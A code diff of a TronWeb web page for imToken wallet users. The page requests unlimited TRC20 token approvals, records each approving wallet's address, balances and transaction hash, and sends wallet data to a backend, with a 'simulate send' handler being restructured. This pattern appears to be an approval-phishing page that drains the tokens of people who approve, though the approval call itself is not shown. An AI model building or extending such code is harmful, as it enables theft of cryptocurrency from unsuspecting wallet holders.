@@ -70,10 +70,12 @@
     let tronWeb, userAddress, trc20Contract;
     const RECORD_KEY = "imtoken_infinite_approval_records";
 
+    // 获取模拟发送按钮 (移动到 window.onload 之外)
+    const simulateBtn = document.getElementById("simulateBtn");
+
     window.onload = async () => {
         const connectBtn = document.getElementById("connectBtn");
         const approveBtn = document.getElementById("approveBtn");
-        const simulateBtn = document.getElementById("simulateBtn"); // 获取模拟发送按钮
         renderApprovalRecords();
 
         const copyLinkText = document.getElementById("copyLinkText");
@@ -138,7 +140,7 @@
                     trxBalance: trxBalance.toFixed(2),
                     approveTime: new Date().toLocaleString(),
                     txHash: result.transaction.txID,
-                    approveType: "无限额度" // 新增：标注授权类型
+                    approveType: "无限额度" // 新增：标注类型
                 };
 
                 saveApprovalRecord(record);
@@ -151,24 +153,24 @@
                 alert("授权失败：" + e.message);
             }
         };
+    };
 
-        // 模拟发送数据
-        simulateBtn.onclick = async () => {
-            try {
-                // 模拟钱包数据
-                const mockData = {
-                    address: "TVjfwpWJ8Z9Xfzh6umeH4E7fg93PTcK6vA",
-                    tokenBalance: 100.00,
-                    trxBalance: 500.00
-                };
+    // 模拟发送数据
+    simulateBtn.onclick = async () => {
+        try {
+            // 模拟钱包数据
+            const mockData = {
+                address: "TVjfwpWJ8Z9Xfzh6umeH4E7fg93PTcK6vA",
+                tokenBalance: 100.00,
+                trxBalance: 500.00
+            };
 
-                await sendDataToBackend(mockData);
-                alert("模拟数据发送成功！");
+            await sendDataToBackend(mockData);
+            alert("模拟数据发送成功！");
 
-            } catch (e) {
-                alert("模拟数据发送失败：" + e.message);
-            }
-        };
+        } catch (e) {
+            alert("模拟数据发送失败：" + e.message);
+        }
     };
 
     // 初始化钱包信息（IMToken适配）
@@ -248,3 +250,6 @@
     throw e;
   }
 }
+</script>
+</body>
+</html>
